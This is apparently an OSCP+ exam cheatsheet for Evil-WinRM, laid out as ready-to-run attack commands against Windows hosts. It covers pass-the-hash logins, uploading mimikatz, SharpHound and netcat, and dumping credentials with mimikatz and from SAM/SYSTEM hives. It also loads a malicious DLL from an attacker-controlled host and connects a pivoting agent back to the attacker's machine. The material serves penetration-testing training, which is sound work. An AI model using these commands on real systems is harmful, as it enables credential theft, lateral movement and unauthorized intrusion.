# Evil-WinRM - Cheatsheet (OSCP+)

Evil-WinRM is a tool that gives you a PowerShell shell on a Windows target over WinRM (port 5985/5986). If a user is in the **Remote Management Users** group or is a local admin, you can get a shell.

---

## Basic Connection

#### With Password

```bash
evil-winrm -i 10.10.10.5 -u username -p 'password'

# With domain
evil-winrm -i 10.10.10.5 -u username -p 'password' -d domain.local
```

#### With NTLM Hash (Pass the Hash)

```bash
evil-winrm -i 10.10.10.5 -u administrator -H NTLM_HASH_HERE

# Example
evil-winrm -i 10.10.10.5 -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e
```

#### With Kerberos Ticket

```bash
export KRB5CCNAME=administrator.ccache
evil-winrm -i DC01.domain.local -u administrator -r domain.local
```

---

## File Transfer (Built-in)

This is one of the best features — no need for python servers or certutil.

#### Upload Files to Target

```bash
# Inside evil-winrm shell
upload /home/kali/tools/winPEAS.exe C:\Users\Public\winPEAS.exe

# Short version (uploads to current directory)
upload /home/kali/tools/SharpHound.exe
upload /home/kali/tools/PowerUp.ps1
upload /home/kali/tools/nc.exe
upload /home/kali/tools/mimikatz.exe
```

#### Download Files from Target

```bash
# Inside evil-winrm shell
download C:\Users\Administrator\Desktop\proof.txt /home/kali/proof.txt

# Download SAM/SYSTEM for offline dumping
download C:\temp\SAM /home/kali/SAM
download C:\temp\SYSTEM /home/kali/SYSTEM
```

---

## Load PowerShell Scripts

#### Load Scripts at Connection

```bash
# -s flag loads all .ps1 scripts from a directory
evil-winrm -i 10.10.10.5 -u admin -p 'password' -s /home/kali/tools/

# Now inside the shell you can run:
PowerUp.ps1
Invoke-AllChecks

# Or load SharpHound
SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

#### Load Executables at Connection

```bash
# -e flag loads executables
evil-winrm -i 10.10.10.5 -u admin -p 'password' -e /home/kali/tools/

# Inside shell, run .NET executables in memory
Invoke-Binary /home/kali/tools/SharpUp.exe
Invoke-Binary /home/kali/tools/Seatbelt.exe all
Invoke-Binary /home/kali/tools/Rubeus.exe kerberoast
```

---

#### Built-in Commands

```bash
# Inside evil-winrm shell

# Menu - shows all available commands
menu

# Check services
services

# Upload/Download
upload <local_path> <remote_path>
download <remote_path> <local_path>

# Load DLL in memory
Dll-Loader -http http://YOUR_IP/evil.dll
Dll-Loader -smb \\YOUR_IP\share\evil.dll
Dll-Loader -local C:\temp\evil.dll
```

---

## OSCP+ Common Uses

#### Run PowerUp for PrivEsc

```bash
evil-winrm -i 10.10.10.5 -u user -p 'password' -s /home/kali/tools/

# Inside shell
PowerUp.ps1
Invoke-AllChecks
```

#### Run WinPEAS

```bash
# Upload and run
upload /home/kali/tools/winPEASany.exe
.\winPEASany.exe
```

#### Run BloodHound Collector

```bash
evil-winrm -i 10.10.10.5 -u user -p 'password' -s /home/kali/tools/

# Inside shell
SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Download the zip
download C:\Users\user\20240101_BloodHound.zip /home/kali/bloodhound.zip
```

#### Run Mimikatz

```bash
upload /home/kali/tools/mimikatz.exe

# Dump creds (need admin/SYSTEM)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump SAM
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

#### Grab Proof Flags

```bash
# Local flag
type C:\Users\user\Desktop\local.txt

# Admin flag
type C:\Users\Administrator\Desktop\proof.txt
```

---

### SSL/HTTPS Connection (Port 5986)

```bash
# If WinRM is running on port 5986 (HTTPS)
evil-winrm -i 10.10.10.5 -u admin -p 'password' -S

# With client certificate
evil-winrm -i 10.10.10.5 -u admin -p 'password' -S -c cert.pem -k key.pem
```

---

### Check WinRM Access Before Connecting

```bash
# NetExec - check if user has WinRM access
nxc winrm 10.10.10.5 -u username -p 'password'
nxc winrm 10.10.10.5 -u username -H NTLM_HASH

# If it shows (Pwn3d!) = you can connect with evil-winrm
```

---

### OSCP+ Exam Quick Reference

```bash
# === Got password ===
evil-winrm -i TARGET_IP -u user -p 'password'

# === Got hash from secretsdump ===
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH

# === First things to do after connecting ===
whoami
whoami /priv
whoami /groups
hostname
ipconfig /all
type C:\Users\user\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt

# === Upload tools ===
upload /home/kali/tools/winPEASany.exe
upload /home/kali/tools/PowerUp.ps1
upload /home/kali/tools/SharpHound.exe

# === If you need to pivot ===
upload /home/kali/tools/ligolo-agent.exe
.\ligolo-agent.exe -connect YOUR_KALI_IP:11601 -retry -ignore-cert
```

---

### Pro Tips

- Evil-WinRM gives you a full PowerShell shell — much better than a basic cmd reverse shell
- Use `-s` flag to preload scripts — saves time during exam
- Built-in upload/download is faster than setting up python servers
- Always check WinRM access with NetExec first before trying to connect
- If evil-winrm fails, try: `impacket-psexec`, `impacket-wmiexec`, or `impacket-smbexec` instead
- Port 5985 = HTTP, Port 5986 = HTTPS (use `-S` flag for HTTPS)
- User must be in **Remote Management Users** group or be local admin